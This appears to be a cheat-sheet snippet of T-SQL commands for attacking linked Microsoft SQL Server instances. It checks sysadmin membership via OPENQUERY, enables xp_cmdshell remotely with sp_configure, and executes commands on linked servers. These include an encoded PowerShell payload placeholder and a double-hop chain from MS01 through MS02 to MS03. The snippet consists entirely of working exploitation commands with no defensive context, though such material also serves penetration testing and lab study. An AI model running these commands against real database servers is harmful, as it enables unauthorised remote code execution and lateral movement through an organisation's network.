```
-- Single hop (MS01 → MS02):
SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT @@version, SYSTEM_USER');
SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- Execute on linked server:
EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];

-- Enable + RCE on linked server:
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
EXEC ('xp_cmdshell ''powershell -enc <BASE64>''') AT [MS02\SQLEXPRESS];

-- Double hop (MS01 → MS02 → MS03):
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];
```